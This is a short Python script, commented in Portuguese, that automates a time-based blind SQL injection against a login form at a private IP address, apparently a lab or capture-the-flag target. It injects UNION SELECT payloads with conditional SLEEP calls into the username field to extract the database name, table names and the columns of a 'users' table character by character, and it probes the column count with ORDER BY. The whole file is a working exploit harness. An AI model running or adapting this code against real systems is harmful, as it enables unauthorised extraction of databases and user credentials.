# vou otimizar dps

import requests,time,string

def req(query):
    url = 'http://10.10.0.4/'
    data = {'username':query, 'password':'lol'}
    r = requests.post(url,data=data)
    return r.text

def fuzz_db():
    characters = string.printable
    db = ''
    #db='cc'
    while True:    
        for char in characters:
            tentativa_db = db + char
            query = "' union select 1,2,if(substring((select database()),1,"+str(len(tentativa_db))+")='"+tentativa_db+"',sleep(3),NULL) -- -"
            ant=time.time()    
            req(query)
            dps=time.time()
            total = dps-ant
            total = int(total)
            if total >= 3:
                db = tentativa_db  
                print(db)
                break
def fuzz_table():
    i=0
    characters = string.printable
    db = ''
    #db='cc'
    while True:   
        for char in characters:
            tentativa_db = db + char
            query = "' union select 1,2,if(substring((select table_name from information_schema.tables where table_schema='cc' limit "+str(i)+",1),1,"+str(len(tentativa_db))+")='"+tentativa_db+"',sleep(3),NULL) -- -"
            ant=time.time() 
            req(query)
            dps=time.time()
            total = dps-ant
            total = int(total)
            if total >= 3:
                db = tentativa_db  
                print(db)
                break
    i+=1
def fuzz_col():
    i=0
    characters = string.printable
    db = ''
    #db='cc'
    while True:   
        for char in characters:
            tentativa_db = db + char
            query = "' union select 1,2,if(substring((select column_name from information_schema.columns where table_name='users' and table_schema='cc' limit 1,1),1,"+str(len(tentativa_db))+")='"+tentativa_db+"',sleep(3),NULL) -- -"
            ant=time.time() 
            req(query)
            dps=time.time()
            total = dps-ant
            total = int(total)
            if total >= 3:
                db = tentativa_db  
                print(db)
                break

def order():
    num = [1,2,3,4,5,6,7,8,9,10]
    for o in num:
        query = "' or 1=1 order by "+str(o)+" -- -"
        print(o)
        print(len(req(query)))

fuzz_col()